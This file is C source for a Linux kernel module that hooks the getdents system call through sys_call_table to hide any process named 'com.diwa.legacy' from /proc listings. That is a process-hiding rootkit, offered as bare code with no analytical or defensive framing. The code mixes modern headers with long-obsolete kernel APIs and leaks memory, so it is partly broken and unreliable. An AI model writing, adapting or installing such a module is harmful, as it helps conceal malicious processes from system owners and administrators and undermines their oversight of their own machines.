#define MODULE
#define __KERNEL__

#include <linux/module.h>
#include <linux/kernel.h>
#include <uapi/asm-generic/unistd.h>
#include <linux/syscalls.h>
#include <uapi/asm-generic/fcntl.h>
#include <uapi/asm-generic/errno.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/mman.h>
#include <linux/string.h>
#include <linux/fs.h>
#include <linux/malloc.h>
#include <linux/proc_fs.h>

extern void* sys_call_table[];

/*process name we want to hide*/
char mtroj[] = "com.diwa.legacy";

int (*orig_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);

/*convert a string to number*/
int myatoi(char *str)
{
 int res = 0;
 int mul = 1;
 char *ptr;
 for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {
  if (*ptr < '0' || *ptr > '9')
   return (-1);
  res += (*ptr - '0') * mul;
  mul *= 10;
 }
 return (res);
}

/*get task structure from PID*/
struct task_struct *get_task(pid_t pid)
{
 struct task_struct *p = current;
 do {
  if (p->pid == pid)
   return p;
   p = p->next_task;
  }
  while (p != current);
  return NULL;
}

/*get process name from task structure*/
static inline char *task_name(struct task_struct *p, char *buf)
{
 int i;
 char *name;

 name = p->comm;
 i = sizeof(p->comm);
 do {
  unsigned char c = *name;
  name++;
  i--;
  *buf = c;
  if (!c)
   break;
  if (c == '\\') {
   buf[1] = c;
   buf += 2;
   continue;
  }
  if (c == '\n') {
   buf[0] = '\\';
   buf[1] = 'n';
   buf += 2;
   continue;
  }
  buf++;
 }
 while (i);
 *buf = '\n';
 return buf + 1;
}

/*check whether we need to hide this process*/
int invisible(pid_t pid)
{
 struct task_struct *task = get_task(pid);
 char *buffer;
 if (task) {
  buffer = kmalloc(200, GFP_KERNEL);
  memset(buffer, 0, 200);
  task_name(task, buffer);
  if (strstr(buffer, (char *) &mtroj)) {
   kfree(buffer);
   return 1;
  }
 }
 return 0;
}

/*see II.4 for more information on filesystem hacks*/
int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)
{
 unsigned int tmp, n;
 int t, proc = 0;
 struct inode *dinode;
 struct dirent *dirp2, *dirp3;

 tmp = (*orig_getdents) (fd, dirp, count);

#ifdef __LINUX_DCACHE_H
 dinode = current->files->fd[fd]->f_dentry->d_inode;
#else
 dinode = current->files->fd[fd]->f_inode;
#endif

 if (dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev) == 1)
  proc=1;
 if (tmp > 0) {
  dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);
  memcpy_fromfs(dirp2, dirp, tmp);
  dirp3 = dirp2;
  t = tmp;
  while (t > 0) {
   n = dirp3->d_reclen;
   t -= n;
  if ((proc && invisible(myatoi(dirp3->d_name)))) {
   if (t != 0)
    memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, t);
   else
    dirp3->d_off = 1024;
    tmp -= n; 
   }
   if (t != 0)
    dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);
  }
  memcpy_tofs(dirp, dirp2, tmp);
  kfree(dirp2);
 }
 return tmp;
}


int init_module(void)                /*module setup*/
{
 orig_getdents=sys_call_table[SYS_getdents];
 sys_call_table[SYS_getdents]=hacked_getdents;
 return 0;
}

void cleanup_module(void)            /*module shutdown*/
{
 sys_call_table[SYS_getdents]=orig_getdents;                                      
}
